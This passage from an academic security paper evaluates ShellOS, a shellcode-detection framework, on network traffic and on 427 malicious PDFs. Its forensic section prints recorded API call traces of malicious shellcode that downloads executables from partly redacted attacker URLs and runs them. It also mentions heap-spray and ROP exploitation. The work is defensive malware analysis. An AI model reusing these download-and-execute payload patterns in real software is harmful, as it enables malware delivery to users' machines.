level properties such as round trip time. Tmix also pro-
vides a block resampling algorithm to achieve a target
throughput while preserving the statistical properties of
the original network trace.
We supply Tmix with a network trace of HTTP con-
nections captured on the border links of UNC-Chapel
Hill in October, 20095. The trace represents 1-hour of
activity, which is more than long enough to capture dis-
tributions for many statistical measures indistinguishable
from longer traces [14]. Using Tmix block resampling,
we run two 1-hour experiments based on the original
trace where Tmix attempts to maintain a throughput of
100Mbps in the ﬁrst experiment and 350Mbps in the sec-
ond experiment. The actual throughput ﬂuctuates some
as Tmix maintains statistical properties observed in the
original network trace. We repeat each experiment with
the same seed (to generate the same trafﬁc) using both
Nemu and ShellOS.
Both ShellOS and Nemu are conﬁgured to only ana-
lyze trafﬁc from the connection initiator, as we are target-
ing code injection attacks on network services. We ana-
lyze up to one megabyte of a network connection (from
the initiator) and set an execution threshold of 60k in-
structions (see section §5.1). Neither ShellOS or Nemu
perform any instruction chain pruning (e.g. we try exe-
cution from every position in every buffer) and use only
a single cpu core.
Figure 6 shows the results of the network experi-
ments. The bottom subplot shows the trafﬁc throughput
generated over the course of both 1-hour experiments.
The 100Mbps experiment actually ﬂuctuates from 100-
160Mbps, while the 350Mbps experiment nearly reaches
500Mbps at some points. The top subplot depicts the
number of buffers analyzed over time for both ShellOS
and Nemu with both experiments. Note that one buffer
is analyzed for each connection containing data from the
connection initiator. The plot shows that the maximum
number of buffers per second for Nemu hovers around
75 for both the 100Mbps and 350Mbps experiments with
signiﬁcant packet loss observed in the middle subplot.
ShellOS is able to process around 250 buffers per sec-
ond in the 100Mbps experiment with zero packet loss and
around 750 buffers per second in the 350Mbps experi-
ment with intermittent packet loss. That is, ShellOS
is able to process all buffers with 1 CPU core, with-
out loss, on a network with sustained 100Mbps network
throughput, while ShellOS is on the cusp of its maxi-
mum throughput on 1 CPU core on a network with sus-
tained 350Mbps network throughput (and spikes up to
500Mbps). In these tests, we received no false positives
for either ShellOS or Nemu.
Our experimental network setup, unfortunately, is not
currently able to generate sustained throughput greater
than the 350Mbps experiment. Therefore, to demonstrate
ShellOS’ scalability in leveraging multiple CPU cores,
we instead turn to an analysis of the libnids packet
queue size in the 350Mbps experiment. We ﬁx the max-
imum packet queue size at 100k, then run the 350Mbps
experiment 4 times utilizing 1, 2, 4, and 14 cores. When
the packet queue size reaches the maximum, packet loss
occurs. The average queue size should be as low as pos-
sible to minimize the chance of packet loss due to sud-
den spikes in network trafﬁc, as observed in the middle
subplot of Figure 6 for the 350Mbps ShellOS exper-
iment. Figure 7 shows the CDF of the average packet
queue size over the course of each 1-hour experiment run
with a different number of CPU cores. The ﬁgure shows
ShellOSNemuEthernet SwitchEthernet Switch1 Gbps1 Gbps1 Gbps10Gbps10Gbps1G Network TapThroughput MonitorTap  LinkTo DAGTo Appliance Monitoring ApplianceLinux RouterLinux Router16 tmix FreeBSD endsystems16 tmix FreeBSD endsystemsFigure 6: ShellOS network throughput performance.
that using 2 cores reduces the average queue size by an
order of magnitude, 4 cores reduces average queue size
to less than 10 packets, and 14 cores is clearly more than
sufﬁcient for 350Mbps sustained network trafﬁc. This
evidence suggests that multi-core ShellOS may be ca-
pable of monitoring links with much greater throughput
than we were able to generate in our experiments.
Figure 7: CDF of the average packet queue size as the
number of ShellOS CPU cores is scaled.
5.3 Case Study: PDF Code Injection
We now report on our experience using this framework to
analyze a collection of 427 malicious PDFs. These PDFs
were randomly selected from a larger subset of suspi-
cious ﬁles ﬂagged by a large-scale web malware detec-
tion system. Each PDF is labeled with a Common Vul-
nerability Exposure (CVE) number (or “Unknown” tag).
Of these ﬁles, 22 were corrupted, leaving us with a total
of 405 ﬁles for analysis. We also use a collection of 179
benign PDFs from various USENIX conferences.
We launch each document with Adobe Reader and at-
tach the memory facility to that process. We then snap-
shot the heap as the document is rendered, and wait un-
til the heap buffers stop growing. 374 of the 405 mali-
cious PDFs resulted in a unique set of buffers. ShellOS
is then signaled that the buffers are ready for inspec-
tion. Note that we only generate the process layout once
per application (e.g., Reader), and subsequent snapshots
only contain the heap buffers.
Figure 8 shows the size distribution of heap buffers
extracted from benign and malicious PDFs. Notice that
≈ 60% of the buffers extracted from malicious PDF are
512K long. This striking feature can be attributed to
the heap allocation strategy used by the Windows OS,
whereby chunks of 512K and higher are memory aligned
at 64K boundaries. As noted by Ding et al. [7], attack-
ers can take advantage of this alignment to increase the
success rate of their attacks (e.g., by providing a more
 0 100 200 300 400 500 600 700 800 900 10 20 30 40 50Network Buffers/sec 0 20 40 60 80 100 10 20 30 40 50%Pkt LossShellOS 350 MbpsShellOS 100MbpsNemu 100MbpsNemu 350Mbps 0 100 200 300 400 500 10 20 30 40 50MbpsTime (mins)350Mbps Traffic100Mbps Traffic 0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9 1 0.01 0.1 1 10 100 1000 10000 100000CDFAverage Queue Size (Lower is better)ShellOS 1 CoreShellOS 2 CoresShellOS 4 CoresShellOS 14 CoresFigure 8: CDF of sizes of the extracted buffers
Figure 9: Elapsed time for extracting heap objects
predictable landing spot for the shellcode when used in
conjunction with large NOP-sleds).
CVE
CVE-2007-5659
CVE-2008-2992
CVE-2009-4324
CVE-2009-2994
CVE-2009-0927
CVE-2010-0188
CVE-2010-2883
Unknown
Detected
2
10
12
1
33
53
70
144
Table 2: CVE Distribution for Detected Attacks
Table 2 provides a breakdown of the corresponding
CVE listings for the 325 unique code injection attacks we
detected. Interestingly, we were able to detect 70 attacks
using Return Oriented Programming (ROP) because of
their second-stage exploit (CVE-2010-2883) triggering
the PEB heuristic. We veriﬁed these attacks used ROP
through subsequent manual analysis of the javascript in-
cluded in the PDFs and reiterate that our current runtime
heuristics do not directly detect ROP code, but that in
all the examples we observed using ROP, control was al-
ways transferred to non-ROP shellcode to perform the
primary actions of the attack. We believe that in the fu-
ture the ﬂexibility of ShellOS’ ability to load arbitrary
process snapshots may be leveraged to correctly execute,
detect, and diagnose ROP by iterating the stack pointer
(instead of the IP) over a buffer and issuing a ret in-
struction to test every position of a buffer for ROP. This
may be critical as attackers become more adapt at craft-
ing ROP-only code injection attacks.
Figure 9 depicts the CDF for extracting heap objects
from malicious and benign documents. The time distri-
bution for malicious documents is further broken down
by “ROP-based” (i.e., CVE-2010-2883) and other ex-
ploits. The group labeled other performed more tradi-
tional heap-spray attacks with self-contained shellcode,
and is not particularly interesting (at least, from a foren-
sic standpoint). In either case, we were able to extract
approximately 98% of the buffers within 26 seconds. For
the benign ﬁles, extraction took less than 5 seconds for
98% of the documents. The low processing time of the
benign case is because the buffers are allocated just once
when the PDF is rendered on open, as opposed to hun-
dreds of heap objects created by the embedded javascript
that performs the heap-sprays.
Figure 10: Breakdown of average time of analysis.
The overall time for performing our analyses is given
in Figure 10. Notice that the majority of the time
can be attributed to buffer extraction. Once signalled,
ShellOS analyzes the buffers at high speed. The av-
erage time to analyze a benign PDF (the common case,
 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9 1 10 100 1000 10000CDFBuffer Size (KB)Benign PDFsSuspicious PDFs 0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9 1 1 10 100CDFTime (seconds)ROPOther Benign PDFs 0 5 10 15 20 25BenignROPOtherTime (seconds)Exploit TypeExtractionDetection+Analysishopefully) is 5.46 seconds with our unoptimized code.
We remind the reader that the framework we provide
is not tied to any particular method of buffer extraction.
To the contrary, ShellOS executes any arbitrary buffer
supplied by the analyst and reports if the desired heuris-
tics are triggered. In this case-study, we simply chose to
highlight the usefulness of ShellOS with buffers pro-
vided by our own PDF pre-processor.
Next, we describe some of the patterns we observed
lurking within PDF-based code injection attacks.
5.4 Forensic Analysis
Recall that once injected code is detected, ShellOS
continues to allow execution to collect diagnostic traces
of Windows API calls before returning a result. In the
majority of cases, the diagnostics completed successfully
for the PDF dataset. Of the diagnostics performed in the
other category, we found that 85% of the injected code
exhibited an identical API call sequence:
begin snippet
LoadLibraryA("urlmon")
URLDownloadToCacheFile(
URL = "http://(omitted).cz.cc/
CacheFile = "%tmp%")
CreateProcessA(App = "%tmp%", Cmd = (null))
TerminateThread(Thread = -2, ExitCode = 0)
out.php?a=36&p=5",
end snippet
The top level domains were always cz.cc and
the GET request parameters varied only in numerical
value. We also observed that all of the remaining
PDFs in the other category (where diagnostics suc-
ceeded) used either the URLDownloadToCacheFile
or URLDownloadToFile API call to download a ﬁle,
then executed it with CreateProcessA, WinExec,
or ShellExecuteA. Two of these shellcodes at-
tempted to download several binaries from the same do-
main, and a few of the requested URLs contained obvi-
ous text-based information pertinent to the exploit used,
e.g. exp=PDF (Collab), exp=PDF (GetIcon),
or ex=Util.Printf – presumably for bookkeeping
in an overall diverse attack campaign.
Two of the self-contained payloads were only partially
analyzed by the diagnostics, and proved to be quite inter-
esting. The partial call trace for the ﬁrst of these is given
in Figure 11. Here, the injected code allocates space on
the heap, then copies code into that heap area. Although
the code copy is not apparent in the API call sequence
alone, ShellOS may also provide an instruction-level
trace (when requested by the analyst) by single-stepping
each instruction via the TRAP bit in the ﬂags register. We
observed the assembly-level copies using this feature.
The code then proceeds to patch several DLL functions,
partially observed in this trace by the use of API calls to
modify page permissions prior to patching, then resetting
them after patching. Again, the assembly-level patching
code is only observable in a full instruction trace. Finally,
the shellcode performs the conventional URL download
and executes that download.
begin snippet
GlobalAlloc(Flags = 0x0, Bytes = 8192)
VirtualProtect(Addr = 0x7c86304a, Size = 4096,
Protect = 0x40)
VirtualProtect(Addr = 0x7c86304a, Size = 4096,
Protect = 0x20)
LoadLibraryA("user32")
VirtualProtect(Addr = 0x77d702d3, Size = 4096,
VirtualProtect(Addr = 0x77d702d3, Size = 4096,
Protect = 0x40)
Protect = 0x20)
LoadLibraryA("ntdll")
VirtualProtect(Addr = 0x7c918c2e, Size = 4096,
Protect = 0x40)
VirtualProtect(Addr = 0x7c918c2e, Size = 4096,
Protect = 0x20)
LoadLibraryA("urlmon")
URLDownloadToCacheFile(
URL = "http://www.(omitted).net/file.exe",
CacheFile = "%tmp%")
CreateProcessA(App=(null), Cmd="cmd /c %tmp%")
...
end snippet
Figure 11: More complex shellcode in a PDF
The second interesting case challenges our prototype
diagnostics by applying some anti-analysis techniques.
The partial API call sequence observed follows:
begin snippet
GetFileSize(hFile = 0x4)
GetTickCount()
GlobalAlloc(Flags = 0x40, Bytes = 4) = buf*
ReadFile(hFile = 0x0, Buf* = buf*, Len = 4)
...continues to loop in this sequence...
end snippet
Figure 12: Analysis-resistant Shellcode
As ShellOS does not currently address context-
sensitive code, we have no way of providing the ﬁle size
expected by this code. Furthermore, we do not provide
the required timing characteristics for this particular se-
quence as our API call handlers merely attempt to pro-
vide a ‘correct’ value, with minimal behind-the-scenes
processing. As a result, this sequence of API calls is re-
peated in an inﬁnite loop, preventing further automated
analysis. We note, however, that this particular challenge
is not unique to ShellOS.
Of the 70 detected ROP-based exploit PDFs, 87% of
the second stage payloads adhered to the following API
call sequence:
begin snippet
LoadLibraryA("urlmon")
LoadLibraryA("shell32")
GetTempPathA(Len = 64, Buffer = "C:\TEMP\")
URLDownloadToFile(
URL = "http://(omitted).php?
spl=pdf_sing&s=0907...(omitted)...FC2_1
&fh=",
File = "C:\TEMP\a.exe")
ShellExecuteA(File = "C:\TEMP\a.exe")
ExitProcess(ExitCode = -2),
end snippet
Figure 13: Typical second stage of a ROP-based PDF
code injection attacks observed using ShellOS.
Of the remaining payloads, 6 use an API not yet sup-
ported in ShellOS, while the others are simple variants
on this conventional URL download pattern.